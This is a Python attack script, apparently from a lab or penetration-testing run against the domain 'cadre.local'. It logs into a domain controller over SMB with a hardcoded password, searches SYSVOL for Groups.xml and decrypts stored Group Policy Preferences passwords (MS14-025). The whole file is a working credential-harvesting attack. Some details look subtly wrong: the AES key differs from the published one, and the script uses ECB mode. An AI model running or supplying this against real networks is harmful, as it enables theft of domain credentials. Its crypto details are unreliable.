# GPP Stored Password (Groups.xml) — ws01 native, as analyst_cloud (cadre.local)
# Reads Groups.xml from SYSVOL via impacket SMB + decrypts cpassword (MS14-025 static AES key).
import base64
import io
import sys

try:
    from Crypto.Cipher import AES
    from impacket.smbconnection import SMBConnection

    DC = '192.168.77.10'
    smb = SMBConnection(DC, DC)
    smb.login('analyst_cloud', 'Cl0ud_An@lyst!', 'cadre.local')
    print('SMB_LOGIN_OK as analyst_cloud')

    # Enumerate SYSVOL policy paths for Groups.xml
    tree = smb.connectTree('SYSVOL')
    share = 'SYSVOL'
    results = []

    def walk(path):
        try:
            for f in smb.listPath(share, path + '/*'):
                name = f.get_longname()
                if name in ('.', '..'):
                    continue
                full = (path + '/' + name) if path else name
                if f.is_directory():
                    walk(full)
                elif name.lower() == 'groups.xml':
                    results.append(full)
        except Exception as e:
            pass

    walk('cadre.local/Policies')
    print('GROUPS_XML_FILES', results)
    if not results:
        print('NO_GROUPS_XML')
        sys.exit(1)

    key = bytes.fromhex('4e9906e8fcb66cc9faf49310620d8e2f0b3c9c5a2ca1f3dbd7d9c2d1e8c0c04a')

    for rpath in results:
        print('---', rpath)
        winpath = rpath.replace('/', '\\')
        data_buf = io.BytesIO()
        smb.getFile(share, winpath, data_buf.write)
        data = data_buf.getvalue()
        print('FILE_LEN', len(data))
        text = data.decode('utf-8', errors='replace')
        # extract cpassword via simple parse (handles User and Group elements)
        import re
        elems = re.findall(r'<(?:User|Group)[^>]*name="([^"]+)"', text)
        cp = re.search(r'cpassword="([A-Za-z0-9+/=]+)"', text)
        print('GPP_ELEMENTS', elems)
        if not cp:
            print('NO_CPASSWORD')
            continue
        cpb64 = cp.group(1)
        print('CPASSWORD', cpb64)
        raw = base64.b64decode(cpb64)
        cipher = AES.new(key, AES.MODE_ECB)
        plain = cipher.decrypt(raw)
        pw = plain.decode('utf-16-le', errors='replace').rstrip('\x00')
        print('DECRYPTED_PW', pw)
except Exception as e:
    print('GPP_FAIL', e)
    sys.exit(1)
print('GPP_DONE')
